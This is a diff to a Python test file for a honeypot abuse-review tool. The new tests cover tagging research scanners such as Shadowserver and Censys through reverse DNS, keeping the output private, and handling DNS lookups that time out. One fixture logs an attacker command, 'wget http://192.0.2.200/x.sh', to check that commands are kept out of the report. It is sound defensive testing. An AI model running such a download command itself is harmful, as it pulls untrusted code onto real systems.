@@ -17,6 +17,7 @@ import socket
 import stat
 import sys
 import tempfile
+import threading
 import unittest
 from datetime import datetime, timedelta, timezone
 from pathlib import Path
@@ -138,6 +139,11 @@ class ReviewListTests(unittest.TestCase):
     def test_a_lookalike_domain_is_not_a_scanner(self):
         (c,) = build([visit(A, 1)], resolve=lambda ip: "shodan.io.attacker.example")["candidates"]
         self.assertIsNone(c["scanner"])
+
+    def test_shadowservers_io_domain_counts_as_a_scanner(self):
+        (c,) = build([visit(A, 1)], resolve=lambda ip: "scanner-1.shadowserver.io")["candidates"]
+        self.assertTrue(c["skip"])
+        self.assertIn("shadowserver.io", c["scanner"])
 
     def test_the_review_list_holds_no_passwords_commands_or_addresses(self):
         visits = [visit(A, 1, commands=["wget http://192.0.2.200/x.sh"], urls=["http://192.0.2.200/x.sh"],
@@ -298,6 +304,95 @@ class ReviewMainTests(unittest.TestCase):
         self.run_main()
         self.assertEqual(list(json.loads(record.read_text())["reports"]), [D])
         self.assertEqual(stat.S_IMODE(os.stat(record).st_mode), 0o600)
+
+
+class ScannerListTests(unittest.TestCase):
+    """--scanners: every visitor checked for research scanners, saved for the notebook."""
+    CENSYS = "162.142.125.10"
+
+    def setUp(self):
+        self.tmp = tempfile.TemporaryDirectory()
+        self.logs = Path(self.tmp.name) / "honeypot-logs"
+        self.logs.mkdir()
+        lines = [visit(A, 1, commands=["id"]), visit(B, 2, outcome="attempted"), visit(self.CENSYS, 3, outcome="silent"),
+                 visit(C, 30, outcome="attempted"), visit(D, 4, password="not-on-the-list"), visit("10.0.0.5", 1)]
+        (self.logs / "visits-2026-11-08.jsonl").write_text("".join(json.dumps(v) + "\n" for v in lines))
+        self.out = self.logs / "intel" / "scanners.json"
+        self.names = {B: "scanner-1.shadowserver.io", C: "host-1.example.net"}
+        self.looked_up, self.original = [], abuse_review.forward_confirmed_name
+
+        def fake(ip):
+            self.looked_up.append(ip)
+            return self.names.get(ip)
+
+        abuse_review.forward_confirmed_name = fake
+
+    def tearDown(self):
+        abuse_review.forward_confirmed_name = self.original
+        self.tmp.cleanup()
+
+    def run_main(self, *extra):
+        stdout = io.StringIO()
+        with contextlib.redirect_stdout(stdout):
+            abuse_review.main(["--logs", str(self.logs), "--scanners", *extra], now=NOW)
+        return stdout.getvalue()
+
+    def saved(self):
+        return json.loads(self.out.read_text())["ips"]
+
+    def test_every_visitor_is_checked_whatever_it_did(self):
+        self.run_main("--since", (NOW - timedelta(hours=48)).isoformat())
+        saved = self.saved()
+        self.assertEqual(sorted(saved), sorted([A, B, C, self.CENSYS]), "not my test IP, not a private one")
+        self.assertIsNone(saved[A]["scanner"])
+        self.assertIsNone(saved[C]["scanner"])
+        self.assertIn("shadowserver.io", saved[B]["scanner"])
+        self.assertIn("Censys", saved[self.CENSYS]["scanner"])
+        self.assertTrue(all(r["checked"] for r in saved.values()))
+
+    def test_without_since_it_covers_the_last_day(self):
+        self.run_main()
+        self.assertEqual(sorted(self.saved()), sorted([A, B, self.CENSYS]))
+
+    def test_an_ip_in_a_published_range_needs_no_lookup(self):
+        self.run_main()
+        self.assertEqual(sorted(self.looked_up), sorted([A, B]))
+
+    def test_the_file_is_private_and_the_screen_shows_no_full_ip(self):
+        shown = self.run_main()
+        self.assertIsNone(FULL_IPV4.search(shown), shown)
+        self.assertIn("2 of the 3 IPs", shown)
+        self.assertEqual(stat.S_IMODE(os.stat(self.out).st_mode), 0o600)
+        self.assertEqual(stat.S_IMODE(os.stat(self.out.parent).st_mode), 0o700)
+        self.assertFalse((self.logs / "abuseipdb" / "review.json").exists(), "it builds no review list")
+
+    def test_a_lookup_that_does_not_finish_in_time_is_saved_as_unchecked(self):
+        release = threading.Event()
+
+        def slow_for_a(ip):
+            if ip == A:
+                release.wait(5)
+            return self.names.get(ip)
+
+        abuse_review.forward_confirmed_name = slow_for_a
+        timeout, abuse_review.SCANNER_LIST_DNS_TIMEOUT = abuse_review.SCANNER_LIST_DNS_TIMEOUT, 0.2
+        try:
+            shown = self.run_main()
+        finally:
+            release.set()
+            abuse_review.SCANNER_LIST_DNS_TIMEOUT = timeout
+        saved = self.saved()
+        self.assertFalse(saved[A]["checked"])
+        self.assertTrue(saved[B]["checked"])
+        self.assertIn("1 reverse lookup didn't finish", shown)
+
+    def test_no_dns_checks_only_the_published_ranges(self):
+        self.run_main("--no-dns")
+        saved = self.saved()
+        self.assertEqual(self.looked_up, [])
+        self.assertTrue(saved[self.CENSYS]["checked"])
+        self.assertFalse(saved[A]["checked"])
+        self.assertIsNone(saved[B]["scanner"], "without a lookup its name isn't known")
 
 
 class FakePost:
